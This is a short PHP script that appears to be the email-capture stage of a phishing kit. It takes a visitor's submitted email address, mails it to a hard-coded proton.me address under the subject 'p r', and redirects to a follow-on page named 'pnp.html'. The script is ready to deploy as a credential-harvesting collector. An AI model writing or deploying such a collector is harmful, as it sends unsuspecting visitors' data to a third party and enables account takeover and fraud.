<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);

    $to = "protectiondriveforclear@proton.me"; // Replace with your admin email
    $subject = "p r";
    $message = "Email: $email";
    $headers = "From: protectiondriveforclear@proton.me"; // Replace with your from email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to another page
        header("Location: pnp.html");
        exit();
    } else {
        echo "There was an error sending the email.";
    }
} else {
    echo "Invalid request.";
}
?>
